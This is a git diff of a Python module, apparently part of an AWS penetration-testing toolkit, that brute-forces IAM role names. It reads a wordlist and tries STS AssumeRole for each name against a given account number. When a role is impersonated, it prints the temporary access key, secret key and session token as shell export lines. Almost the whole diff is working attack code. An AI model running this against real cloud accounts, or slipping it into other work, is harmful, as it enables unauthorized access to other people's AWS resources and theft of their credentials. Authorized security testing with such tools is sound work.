@@ -1,16 +1,44 @@
 import boto3
+import os
 
-def brute_role(session, wordlist, acc_number, session_name):
-    sts = sts_functions.Sts()
-    client = sts.get_client(session)
+def assume_role(session, role_name, acc_number, session_name):
+    client = session.client('sts')
+    try:
+        response = client.assume_role(
+                RoleArn='arn:aws:iam::{}:role/{}'.format(acc_number, role_name),
+                RoleSessionName=session_name,
+                DurationSeconds=3600
+                )
+        return response
+    except Exception as e:
+        return(e.response["Error"]["Code"])
+
+def brute_role(session):
+    wordlist = input("Please specify the wordlist to be used: ")
+
+    if not os.path.exists(wordlist):
+        print("[-] Wordlist file not found...")
+
+        return False
+        
+    acc_number = input("Please specify the account number to be used: ")
+    session_name = input("Please specify the session name to be used: ")
+
+    if not session_name:
+        session_name = "AssumedRole"
+        
     role_names_file = open(wordlist, 'r')
     role_names = role_names_file.readlines()
+
     for role_name in role_names:
-        arn = "[+] Trying to impersonate role = arn:aws:iam::{}:role/{}".format(acc_number, role_name)
-        print(arn, end='')
-        AssumeRole = sts.assume_role(client, acc_number, role_name.strip(), session_name)
+        arn = "[+] Trying to impersonate role = arn:aws:iam::{}:role/{}".format(acc_number, role_name.strip())
+        print(arn)
+
+        AssumeRole = assume_role(session, role_name.strip(), acc_number, session_name)
+        
         if AssumeRole == "AccessDenied":
             pass
+
         elif AssumeRole["ResponseMetadata"]["HTTPStatusCode"] == 200:
             print("\n[+] Role Impersonation Successful [+]")
             print("==============================================")
@@ -18,3 +46,9 @@ def brute_role(session, wordlist, acc_number, session_name):
             print("export AWS_SECRET_ACCESS_KEY={}".format(AssumeRole["Credentials"]["SecretAccessKey"]))
             print("export AWS_SESSION_TOKEN={}".format(AssumeRole["Credentials"]["SessionToken"]))
             break
+
+def main(selected_session, session):
+    print("=====================================================================================")
+    print("[+] Starting Bruteforce Roles Module...")
+
+    brute_role(session)
